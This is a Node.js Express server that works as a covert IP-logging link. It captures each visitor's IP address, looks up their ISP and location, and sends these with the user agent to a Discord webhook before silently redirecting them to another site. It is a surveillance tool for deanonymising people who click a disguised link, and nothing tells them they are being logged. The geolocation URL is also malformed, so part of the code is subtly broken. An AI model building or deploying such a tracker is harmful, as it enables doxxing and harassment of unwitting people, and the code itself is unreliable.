const express = require('express');
const app = express();

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol';

app.get('/', async (req, res) => {
    // 1. Safely parse out the real visitor IP from the Render proxy string
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    let clientIp = rawIp.split(',')[0].trim(); // Pulls position 0 safely

    // 2. Clear out local server loop values
    if (clientIp.includes('::ffff:')) {
        clientIp = clientIp.replace('::ffff:', '');
    }
    if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') {
        clientIp = '8.8.8.8'; 
    }

    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (DISCORD_WEBHOOK_URL) {
        try {
            // 3. Using native fetch() bypasses the Axios ERR_INVALID_URL adapter bug entirely
            const geoResponse = await fetch(`http://ip-api.com{clientIp}?fields=61439`);
            const geoData = await geoResponse.json();

            const discordPayload = {
                embeds: [{
                    title: "Visitor Logged",
                    color: 15548997, 
                    description: "A user has accessed the tracking link.",
                    fields: [
                        { name: "IP Address", value: `\`${clientIp}\``, inline: true },
                        { name: "ISP Network", value: `\`${geoData.isp || "Unknown"}\``, inline: true },
                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country || "Unknown"}\``, inline: false },
                        { name: "Device / Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
                    ],
                    footer: {
                        text: "System Monitor"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // 4. Send directly to your Discord webhook using native fetch
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

        } catch (error) {
            console.error("Geo Data Retrieval Error:", error.message);
        }
    }

    res.redirect(302, REDIRECT_URL);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
